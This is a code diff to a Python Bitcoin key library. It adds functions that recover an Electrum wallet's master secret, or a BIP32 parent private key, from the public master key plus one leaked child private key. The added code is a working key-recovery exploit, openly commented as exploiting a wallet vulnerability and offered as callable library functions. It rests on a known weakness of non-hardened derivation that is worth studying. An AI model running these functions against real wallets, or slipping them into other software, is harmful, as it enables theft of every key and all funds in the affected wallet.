@@ -31,10 +31,18 @@ def electrum_pubkey(masterkey,n,for_change=0):
 def electrum_address(masterkey,n,for_change=0,version=0):
     return pubkey_to_address(electrum_pubkey(masterkey,n,for_change),version)
 
+# Given a master public key, a private key from that wallet and its index,
+# cracks the secret exponent which can be used to generate all other private
+# keys in the wallet
+def crack_electrum_wallet(mpk,pk,n,for_change=0):
+    offset = dbl_sha256(str(n)+':'+str(for_change)+':'+mpk.decode('hex'))
+    return subtract_privkeys(pk, offset)
+
 # Below code ASSUMES binary inputs and compressed pubkeys
 PRIVDERIV = '\x04\x88\xAD\xE4'
 PUBDERIV = '\x04\x88\xB2\x1E'
 
+# BIP32 child key derivation
 def raw_bip32_ckd(rawtuple, i):
     vbytes, depth, fingerprint, oldi, chaincode, key = rawtuple
     i = int(i)
@@ -101,3 +109,24 @@ def bip32_bin_extract_key(data):
 
 def bip32_extract_key(data):
     return bip32_deserialize(data)[-1].encode('hex')
+
+# Exploits the same vulnerability as above in Electrum wallets
+# Takes a BIP32 pubkey and one of the child privkeys of its corresponding privkey
+# and returns the BIP32 privkey associated with that pubkey
+def raw_crack_bip32_privkey(parent_pub,priv):
+    vbytes, depth, fingerprint, i, chaincode, key = priv
+    pvbytes, pdepth, pfingerprint, pi, pchaincode, pkey = parent_pub
+    i = int(i)
+
+    if i >= 2**31: raise Exception("Can't crack private derivation!")
+
+    I = hmac.new(pchaincode,pkey+encode(i,256,4),hashlib.sha512).digest()
+
+    pprivkey = subtract_privkeys(key,I[:32]+'\x01')
+
+    return (PRIVDERIV, pdepth, pfingerprint, pi, pchaincode, pprivkey)
+
+def crack_bip32_privkey(parent_pub,priv):
+    dsppub = bip32_deserialize(parent_pub)
+    dspriv = bip32_deserialize(priv)
+    return bip32_serialize(raw_crack_bip32_privkey(dsppub,dspriv))
